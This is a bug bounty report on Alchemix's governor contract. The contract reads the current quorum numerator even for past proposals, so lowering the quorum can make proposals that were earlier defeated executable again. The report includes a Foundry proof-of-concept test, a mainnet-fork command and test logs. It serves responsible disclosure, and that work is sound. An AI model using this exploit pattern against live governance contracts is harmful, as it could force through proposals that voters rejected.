# 31355 - \[SC - Low] Past Defeated Proposals Can Be Executed in the ...

Submitted on May 17th 2024 at 16:06:05 UTC by @Breeje for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31355

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/AlchemixGovernor.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

The `AlchemixGovernor` contract uses an implementation of `L2GovernorVotesQuorumFraction`, which has a known vulnerability. If a proposal passes to lower the quorum requirement, all past proposals that were defeated solely due to a lack of quorum may become executable if the votes they received now meet the new, lower quorum requirement.

## Vulnerability Details

The `AlchemixGovernor` contract inherits from `L2GovernorVotesQuorumFraction`, whose implementation is similar to OpenZeppelin's `GovernorVotesQuorumFraction` contract version `4.5.0`.

#### Proposal Execution Process

To understand the issue, we need to examine how a proposal is executed:

1. The `execute` function identifies the state of the proposal by calling the `state` function.

```solidity

    function execute(
      // SNIP
    ) public payable virtual override returns (uint256) {
      uint256 proposalId = hashProposal(targets, values, calldatas, descriptionHash, chainId);

@->     ProposalState status = state(proposalId);
        require(
            status == ProposalState.Succeeded || status == ProposalState.Queued,
            "Governor: proposal not successful"
        );
        _proposals[proposalId].executed = true;

        // SNIP
    }

```

2. The `state` function, after validation, checks two things: whether quorum was reached and whether the vote succeeded.

```solidity

    function state(uint256 proposalId) public view virtual override returns (ProposalState) {
      // SNIP: Validation

@->   if (_quorumReached(proposalId) && _voteSucceeded(proposalId)) {
          return ProposalState.Succeeded;
      } else {
          return ProposalState.Defeated;
      }
    }

```

3. The `_quorumReached` function calls the `quorum` function with `proposalSnapshot(proposalId)` as the timestamp.

```solidity

    function _quorumReached(uint256 proposalId) internal view virtual override returns (bool) {
        ProposalVote storage proposalvote = _proposalVotes[proposalId];

@->     return quorum(proposalSnapshot(proposalId)) <= proposalvote.forVotes + proposalvote.abstainVotes;
    }

```

4. The `quorum` function of `L2GovernorVotesQuorumFraction` is implemented as shown below:

```solidity

    function quorum(uint256 blockTimestamp) public view virtual override returns (uint256) {
@-.     return (token.getPastTotalSupply(blockTimestamp) * quorumNumerator()) / quorumDenominator();
    }

    function quorumNumerator() public view virtual returns (uint256) {
        return _quorumNumerator;
    }

```

Notice the following critical point:

* While the function gets the total supply value based on the timestamp, it uses the `quorumNumerator()` function, which returns the current `quorumNumerator` value rather than the value at the time of `blockTimestamp`.

#### Consequences of the Issue

1. If `quorum` was not reached for a past proposal, it cannot be executed at that time and is in a `defeated` state.
2. If governance updates the `_quorumNumerator` to a lower value using `updateQuorumNumerator` function:
   * The past defeated proposal may now reach the quorum with the new lower requirement.
   * The proposal state can change to succeeded, making it executable again.

## Impact Details

Past proposals that were defeated only due to a lack of quorum may become executable if the number of votes they received meets the new quorum requirement.

## References and Mitigation

This vulnerability is recognized by OpenZeppelin with a high severity rating. They issued a security advisory for it, which can be found [here](https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-xrc4-737v-9q75).

OpenZeppelin mitigated this issue in version `4.7.2` by:

* Deprecating the direct use of `_quorumNumerator` in the `quorumNumerator()` function.
* Implementing `Checkpoints` for the new `_quorumNumeratorHistory` variable to track past values of the quorum numerator relative to time and using the value as it was at the blockTimestamp.

The changes are detailed in this [commit](https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3561/files).

## Proof of Concept

#### Adding Test

Add the following lines in the `L2Governor` contract:

```solidity

  function pushCalldata(bytes calldata calldataHash) public {
      _governanceCall.pushBack(keccak256(calldataHash));
  }

```

Add the following `testPoC` function in `AlchemixGovernorTest.t.sol` test:

```solidity

    function testPoC() public {

        // 1. Initial Setup
        
        createVeAlcx(dead, 32e21, MAXTIME, false);
        createVeAlcx(admin, TOKEN_100K, MAXTIME, false);

        assertFalse(voter.isWhitelisted(usdc));

        (address[] memory t, uint256[] memory v, bytes[] memory c, string memory d) = craftTestProposal();
    
        hevm.warp(block.timestamp + 2 days); // delay

        // 2. Asserting Voting Power is less than quorum Initially

        {
            uint256 votingPower = veALCX.getVotes(dead);
            console2.log("Initial Voting Power: ",votingPower);

            uint256 quorum = governor.quorum(block.timestamp);
            console2.log("Initial Quorum:       ", quorum);
            
            assertGt(quorum, votingPower, "quorum should be greater than voting power");
        }

        // 3. Creating a Proposal

        hevm.startPrank(admin);
        uint256 pid = governor.propose(t, v, c, d, MAINNET);
        hevm.warp(block.timestamp + governor.votingDelay() + 1); // delay
        hevm.roll(block.number + 1);
        hevm.stopPrank();
        
        // 4. Voting in favour of proposal

        hevm.startPrank(dead);
        governor.castVote(pid, 1);
        hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period
        hevm.stopPrank();

        // 5. Revert on executing the proposal because quorum not reached

        hevm.startPrank(admin);
        hevm.expectRevert(abi.encodePacked("Governor: proposal not successful"));
        governor.execute(t, v, c, keccak256(bytes(d)), MAINNET);

        hevm.stopPrank();

        // 6. Updating quorum numerator to 11% from 20%.

        {
            // Get the address of the Timelock (the executor)        
            address executor = address(governor.timelock());
            uint256 newQuorumNumerator = 1100;

            // Prepare the calldata
            bytes memory calldataRequired = abi.encodeWithSelector(
                bytes4(
                    keccak256("updateQuorumNumerator(uint256)")
                ),
                newQuorumNumerator
            );

            // Add it to the queue
            governor.pushCalldata(calldataRequired);

            hevm.startPrank(address(executor));

            // Impersonate the executor and call the function
            governor.updateQuorumNumerator(uint256(newQuorumNumerator));

            hevm.stopPrank();
        }

        // 7. Again Executing the past proposal, which gets execute successfully where it shouldn't
        {
            // execute
            hevm.startPrank(admin);

            uint256 votingPowerNew = veALCX.getVotes(dead);
            console2.log("Final Voting Power:   ",votingPowerNew);

            uint256 quorumNew = governor.quorum(block.timestamp);
            console2.log("Final Quorum:         ",quorumNew);

            assertGt(votingPowerNew, quorumNew, "voting power should be greater than quorum");

            hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
            governor.execute(t, v, c, keccak256(bytes(d)), MAINNET);

            hevm.stopPrank();
        }
    }

```

#### Running Test

Use the following command to run the test:

```powershell

  forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/${ALCHEMY_API} --match-test testPoC --fork-block-number 17133822 -vvv

```

#### Expected Test Result

```powershell

  Running 1 test for src/test/AlchemixGovernor.t.sol:AlchemixGovernorTest
  [PASS] testPoC() (gas: 2013285)
  Logs:
    Initial Voting Power:  63473899543378978660812
    Initial Quorum:        92037551049771679068955
    Final Voting Power:    62597183155758481682946
    Final Quorum:          49921468744534494597083

  Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 22.70ms

  Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

#### Analysis of the Result

In the test logs, you can see the following key points:

1. Initial Voting Power vs Quorum:
   * Initial Voting Power: `63473899543378978660812`
   * Initial Quorum: `92037551049771679068955`
   * Can clearly see `Voting Power` < `Quorum`.
2. Voting on Proposal:
   * Proposal created and voted on.
   * Initial attempt to execute fails due to not meeting quorum.
3. Updating Quorum:
   * Quorum numerator is updated from 20% to 11%.
4. Final Voting Power vs New Quorum:
   * Final Voting Power: `62597183155758481682946`
   * Final Quorum: `49921468744534494597083`
   * Can clearly see, `Voting Power` > `Quorum` now for same past proposal.
5. Executing Past Proposal:
   * The past proposal, initially defeated due to lack of quorum, now meets the new quorum and is executed successfully.

This demonstrates the vulnerability where reducing the quorum can make previously defeated proposals executable, posing a significant governance risk.
